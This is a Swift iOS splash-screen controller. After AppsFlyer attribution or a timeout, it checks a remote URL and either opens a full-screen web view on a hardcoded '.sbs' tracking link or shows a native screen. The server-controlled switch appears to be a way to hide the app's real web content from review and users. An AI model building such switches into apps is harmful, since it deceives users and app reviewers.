import UIKit
import SwiftUI
import AppsFlyerLib

class LoadingSplash: UIViewController {
    
    // MARK: - UI Elements
    private let loadingImage = UIImageView()
    private let activityIndicator: UIActivityIndicatorView = {
        let indicator = UIActivityIndicatorView(style: .large)
        indicator.color = .white
        indicator.translatesAutoresizingMaskIntoConstraints = false
        indicator.hidesWhenStopped = true
        return indicator
    }()
    
    private let statusLabel: UILabel = {
        let label = UILabel()
        label.textColor = .white
        label.font = .systemFont(ofSize: 14)
        label.textAlignment = .center
        label.translatesAutoresizingMaskIntoConstraints = false
        label.isHidden = true
        return label
    }()
    
    // MARK: - Properties
    private var hasReceivedAppsFlyerData = false
    private var timeoutWorkItem: DispatchWorkItem?
    
    // Constants
    private enum Constants {
        static let timeoutDuration: TimeInterval = 10.0
        static let baseURL = "https://jester-twist.sbs/zF6MhF1B?"
    }
    
    // MARK: - Lifecycle
    override func viewDidLoad() {
        super.viewDidLoad()
        setupUI()
        setupFlow()
    }
    
    deinit {
        // Cleanup
        NotificationCenter.default.removeObserver(self)
        timeoutWorkItem?.cancel()
    }
    
    // MARK: - UI Setup
    private func setupUI() {
        print("🚀 Starting setupUI")
        view.backgroundColor = .black
        
        // Setup loading image
        loadingImage.image = UIImage(resource: .logo)
        loadingImage.contentMode = .scaleAspectFit
        loadingImage.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(loadingImage)
        
        // Setup activity indicator
        view.addSubview(activityIndicator)
        
        // Setup status label
        view.addSubview(statusLabel)
        
        NSLayoutConstraint.activate([
            // Loading image constraints
            loadingImage.topAnchor.constraint(equalTo: view.topAnchor),
            loadingImage.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            loadingImage.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            loadingImage.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            
            // Activity indicator constraints
            activityIndicator.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            activityIndicator.centerYAnchor.constraint(equalTo: view.centerYAnchor, constant: 50),
            
            // Status label constraints
            statusLabel.topAnchor.constraint(equalTo: activityIndicator.bottomAnchor, constant: 16),
            statusLabel.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 20),
            statusLabel.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -20)
        ])
    }
    
    // MARK: - Flow Setup
    private func setupFlow() {
        activityIndicator.startAnimating()
        updateStatus("Checking AppsFlyer data...")
        
        // Check for existing data first
        if let savedURL = UserDefaults.standard.string(forKey: "finalAppsflyerURL"), !savedURL.isEmpty {
            print("✅ Using existing AppsFlyer data")
            updateStatus("Data ready!")
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                self.appsFlyerDataReady()
            }
        } else {
            print("⌛ Waiting for AppsFlyer data...")
            updateStatus("Waiting for attribution data...")
            setupAppsFlyerObserver()
            setupTimeout()
        }
    }
    
    private func setupAppsFlyerObserver() {
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(appsFlyerDataReady),
            name: Notification.Name("AppsFlyerDataReceived"),
            object: nil
        )
    }
    
    private func setupTimeout() {
        let workItem = DispatchWorkItem { [weak self] in
            guard let self = self, !self.hasReceivedAppsFlyerData else { return }
            print("⏰ Timeout waiting for AppsFlyer. Proceeding with fallback.")
            self.updateStatus("Proceeding with fallback data...")
            self.appsFlyerDataReady()
        }
        
        timeoutWorkItem = workItem
        DispatchQueue.main.asyncAfter(deadline: .now() + Constants.timeoutDuration, execute: workItem)
    }
    
    // MARK: - AppsFlyer Data Ready
    @objc private func appsFlyerDataReady() {
        guard !hasReceivedAppsFlyerData else { return }
        hasReceivedAppsFlyerData = true
        
        // Cleanup
        timeoutWorkItem?.cancel()
        NotificationCenter.default.removeObserver(self, name: Notification.Name("AppsFlyerDataReceived"), object: nil)
        
        updateStatus("Data received! Checking URL...")
        proceedWithFlow()
    }
    
    // MARK: - Main Flow
    private func proceedWithFlow() {
        CheckURLService.checkURLStatus { [weak self] is200 in
            guard let self = self else { return }
            
            DispatchQueue.main.async {
                self.handleURLStatus(is200: is200)
            }
        }
    }
    
    private func handleURLStatus(is200: Bool) {
        activityIndicator.stopAnimating()
        
        if is200 {
            // WebView flow
            setupWebViewFlow()
        } else {
            // Native app flow
            setupNativeFlow()
        }
    }
    
    private func setupWebViewFlow() {
        print("🌐 Starting WebView flow")
        if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
            appDelegate.restrictRotation = .all
        }
        
        let link = generateTrackingLink()
        print("Generated tracking link: \(link)")
        
        guard let url = URL(string: link) else {
            print("❌ Invalid URL, falling back to native flow")
            setupNativeFlow()
            return
        }
        
        let webViewVC = WebviewVC(url: url)
        webViewVC.modalPresentationStyle = .fullScreen
        self.present(webViewVC, animated: true)
    }
    
    private func setupNativeFlow() {
        print("📱 Starting Native flow")
        if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
            appDelegate.restrictRotation = .portrait
        }
        
        let firstScreen = FirstScreen()
        let navigationController = UINavigationController(rootViewController: firstScreen)
        navigationController.modalPresentationStyle = .fullScreen
        navigationController.navigationBar.isHidden = true
        self.present(navigationController, animated: true)
    }
    
    // MARK: - Tracking Link Generation
    func generateTrackingLink() -> String {
        if let savedURL = UserDefaults.standard.string(forKey: "finalAppsflyerURL"), !savedURL.isEmpty {
            return Constants.baseURL + savedURL
        } else {
            print("⚠️ AppsFlyer data not available, using base URL with fallback parameters")
            let fallbackParams = "appsflyer_id=\(AppsFlyerLib.shared().getAppsFlyerUID())&source=fallback&reason=no_data"
            return Constants.baseURL + fallbackParams
        }
    }
    
    // MARK: - Helper Methods
    private func updateStatus(_ text: String) {
        statusLabel.isHidden = false
        //statusLabel.text = text
        print("📝 Status: \(text)")
    }
}

// MARK: - Debug Helpers
extension LoadingSplash {
    private func debugAppsFlyerData() {
        if let savedURL = UserDefaults.standard.string(forKey: "finalAppsflyerURL") {
            print("🔍 Debug - AppsFlyer URL: \(savedURL)")
        } else {
            print("🔍 Debug - No AppsFlyer URL found")
        }
    }
}
